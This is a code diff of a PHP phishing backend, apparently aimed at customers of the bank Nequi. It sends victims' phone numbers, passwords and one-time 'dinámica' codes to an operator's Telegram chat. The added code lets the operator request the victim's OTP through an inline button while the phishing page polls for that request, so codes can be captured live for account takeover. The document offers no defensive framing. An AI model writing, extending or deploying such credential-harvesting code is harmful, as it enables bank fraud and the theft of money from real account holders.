@@ -9,6 +9,7 @@ header('Content-Type: application/json');
 $USED_TOKENS_FILE = __DIR__ . '/used_tokens.json';
 $UPDATE_OFFSET_FILE = __DIR__ . '/update_offset.txt';
 $PROCESSED_CALLBACKS_FILE = __DIR__ . '/processed_callbacks.json';
+$DINAMICA_STATUS_FILE = __DIR__ . '/dinamica_status.json';
 
 /* ============================================================
    CARGAR CONFIG
@@ -56,6 +57,30 @@ function sendMessage($token, $chatId, $text, $keyboard)
 }
 
 /* ============================================================
+   TELEGRAM: ANSWER CALLBACK QUERY
+   ============================================================ */
+function answerCallbackQuery($token, $callbackQueryId, $text)
+{
+    $payload = [
+        'callback_query_id' => $callbackQueryId,
+        'text' => $text
+    ];
+
+    $ch = curl_init("https://api.telegram.org/bot{$token}/answerCallbackQuery");
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_TIMEOUT => 5,
+        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
+        CURLOPT_POSTFIELDS => json_encode($payload),
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
+    ]);
+    curl_exec($ch);
+    curl_close($ch);
+}
+
+/* ============================================================
    TELEGRAM: EDIT MESSAGE
    ============================================================ */
 function editMessage($token, $chatId, $messageId, $text)
@@ -79,6 +104,23 @@ function editMessage($token, $chatId, $messageId, $text)
     ]);
     curl_exec($ch);
     curl_close($ch);
+}
+
+/* ============================================================
+   DINAMICA STATUS FUNCTIONS
+   ============================================================ */
+function getDinamicaStatus($telefono)
+{
+    if (!file_exists($GLOBALS['DINAMICA_STATUS_FILE'])) return null;
+    $data = json_decode(file_get_contents($GLOBALS['DINAMICA_STATUS_FILE']), true);
+    return $data[$telefono] ?? null;
+}
+
+function setDinamicaStatus($telefono, $status, $messageId = null)
+{
+    $data = file_exists($GLOBALS['DINAMICA_STATUS_FILE']) ? json_decode(file_get_contents($GLOBALS['DINAMICA_STATUS_FILE']), true) : [];
+    $data[$telefono] = ['status' => $status, 'message_id' => $messageId, 'timestamp' => time()];
+    file_put_contents($GLOBALS['DINAMICA_STATUS_FILE'], json_encode($data));
 }
 
 /* ============================================================
@@ -223,6 +265,32 @@ function markCallbackProcessed($callbackId)
 }
 
 /* ============================================================
+   MANEJAR UPDATES DE TELEGRAM
+   ============================================================ */
+if (isset($d['update_id'])) {
+    $update = $d;
+    if (isset($update['callback_query'])) {
+        $callback = $update['callback_query'];
+        $callbackId = $callback['id'];
+        $data = $callback['data'];
+        $messageId = $callback['message']['message_id'];
+
+        if ($data === 'solicitar_dinamica') {
+            $statusData = json_decode(file_get_contents($DINAMICA_STATUS_FILE), true) ?: [];
+            foreach ($statusData as $tel => $info) {
+                if (($info['message_id'] ?? null) == $messageId) {
+                    setDinamicaStatus($tel, 'dinamica_solicitada', $messageId);
+                    answerCallbackQuery($config['token'] ?? '', $callbackId, 'Dinámica solicitada al usuario');
+                    break;
+                }
+            }
+        }
+    }
+    echo json_encode(['ok' => true]);
+    exit;
+}
+
+/* ============================================================
    CONFIG
    ============================================================ */
 $config = loadConfig();
@@ -267,7 +335,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $msg .= "------------------------------\n";
         $msg .= "<b>• 📱 Número Nequi:</b> <code>" . htmlspecialchars($telefono) . "</code>\n";
         $msg .= "<b>• 🔐 Clave:</b> <code>" . htmlspecialchars($clave) . "</code>\n";
-        $msg .= "<b>• 🔢 Dinámica:</b> <code>" . htmlspecialchars($dinamica) . "</code>\n";
+        if (!empty($dinamica)) {
+            $msg .= "<b>• 🔢 Dinámica:</b> <code>" . htmlspecialchars($dinamica) . "</code>\n";
+        }
         $msg .= "------------------------------\n";
 
         // Obtener IP y dispositivo
@@ -295,9 +365,33 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 ]
             ]
         ];
-        $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);
+        if (!empty($dinamica)) {
+            // Editar mensaje existente con dinámica
+            $status = getDinamicaStatus($telefono);
+            if ($status && isset($status['message_id'])) {
+                $editResult = editMessage($config['token'], $config['chat_id'], $status['message_id'], $msg);
+                $sent = ['ok' => !empty($editResult)];
+            } else {
+                $sent = sendMessage($config['token'], $config['chat_id'], $msg, ['inline_keyboard' => []]);
+            }
+        } else {
+            $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);
+
+            // Guardar estado esperando dinámica
+            if (!empty($sent['ok'])) {
+                setDinamicaStatus($telefono, 'esperando_dinamica', $sent['result']['message_id'] ?? null);
+            }
+        }
 
         echo json_encode(['ok' => !empty($sent['ok'])]);
+        exit;
+    }
+
+    // CHECK DINAMICA STATUS
+    if (isset($d['action']) && $d['action'] === 'check_dinamica_status') {
+        $telefono = $d['telefono'] ?? '';
+        $status = getDinamicaStatus($telefono);
+        echo json_encode(['status' => $status ? $status['status'] : null]);
         exit;
     }
 
